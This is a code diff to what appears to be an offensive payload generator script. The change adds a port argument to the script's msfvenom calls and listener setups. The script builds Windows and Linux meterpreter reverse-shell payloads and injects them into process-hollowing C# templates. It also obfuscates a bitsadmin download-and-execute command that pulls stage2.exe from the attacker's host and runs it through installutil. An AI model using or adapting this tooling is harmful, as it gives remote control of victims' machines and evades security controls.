@@ -7,9 +7,10 @@ import os
 
 
 if len(sys.argv) < 2:
-    exit("IP as second argument")
+    exit("IP as second argument and port as third")
 
 ip=sys.argv[1]
+port=sys.argv[2]
 
 def rot(variable_name, text):
     sum = ""
@@ -27,8 +28,8 @@ def rot(variable_name, text):
         result += f"    {variable_name} = {variable_name} & \"{r}\"\n"
     return result
 
-if len(sys.argv) < 2:
-    exit("IP as second argument")
+
+
 
 a=rot('a', 'cmd.exe /C \"bitsadmin /transfer myjob /download /priority high http://'+ip+'/stage2.exe c:\\windows\\tasks\\stage2.exe && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\stage2.exe\"')
 b=rot('b', 'winmgmts:')
@@ -410,7 +411,7 @@ namespace ClassLibrary1
 }
 '''
 
-process = subprocess.Popen(f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ip} LPORT=8443 EXITFUNC=thread -f csharp".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+process = subprocess.Popen(f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ip} LPORT={port} EXITFUNC=thread -f csharp".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
 meterpreter_payload, stderr = process.communicate()
 
 payload = payload.replace("|||meterpreter_payload|||",meterpreter_payload)
@@ -564,7 +565,7 @@ namespace Hollow
 }
 '''
 
-process = subprocess.Popen(f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ip} LPORT=8443 EXITFUNC=thread -f base64".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+process = subprocess.Popen(f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ip} LPORT={port} EXITFUNC=thread -f base64".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
 meterpreter_payload, stderr = process.communicate()
 
 # encrypt payloads
@@ -596,7 +597,7 @@ print(f"""
 use multi/handler       
 set payload windows/x64/meterpreter/reverse_https
 set LHOST {ip}
-set LPORT 8443
+set LPORT {port}
 set EXITFUNC thread
 run -j
       
@@ -621,7 +622,7 @@ powershell -exec bypass -nop -c "bitsadmin /transfer myjob /download /priority h
 ++++++++++++++++++++++++++++++++++++++++
 """)
 
-process = subprocess.Popen(f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT=8443 prependfork=true -f elf -t 300 -e x64/xor_dynamic -o /var/www/html/meter.elf".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+process = subprocess.Popen(f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} prependfork=true -f elf -t 300 -e x64/xor_dynamic -o /var/www/html/meter.elf".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
 meterpreter_payload, stderr = process.communicate()
 
 print(f"""
@@ -632,7 +633,7 @@ print(f"""
 use multi/handler       
 set payload linux/x64/meterpreter/reverse_tcp
 set LHOST {ip}
-set LPORT 8443
+set LPORT {port}
 set prependfork true
 run -j
       
